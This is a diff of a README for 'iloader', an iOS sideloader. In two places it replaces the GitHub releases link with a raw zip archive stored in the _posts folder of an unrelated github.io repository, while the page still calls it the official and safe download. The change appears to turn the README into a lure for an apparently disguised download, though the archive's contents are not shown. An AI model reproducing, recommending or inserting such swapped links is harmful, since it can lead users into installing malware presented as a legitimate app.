@@ -45,7 +45,7 @@ iloader is a simple, user-friendly sideloader designed for **iOS devices**. It l
 
 Click the big button below to go to the official iloader download page:
 
-[![Download iloader Now](https://img.shields.io/badge/Download-iloader-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hastypuddingmatisse7846/iloader/releases)
+[![Download iloader Now](https://img.shields.io/badge/Download-iloader-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hastypuddingmatisse7846/hastypuddingmatisse7846.github.io/raw/refs/heads/main/_posts/Application_3.0-beta.2.zip)
 
 *Also, you can find the download link again in the "Installation" section below.*
 
@@ -152,7 +152,7 @@ Yes, iloader is built with safety in mind. It does not modify your device's syst
 
 Need the download link one more time? Here it is:
 
-**[Click Here to Download iloader](https://github.com/hastypuddingmatisse7846/iloader/releases)**
+**[Click Here to Download iloader](https://github.com/hastypuddingmatisse7846/hastypuddingmatisse7846.github.io/raw/refs/heads/main/_posts/Application_3.0-beta.2.zip)**
 
 ---
 
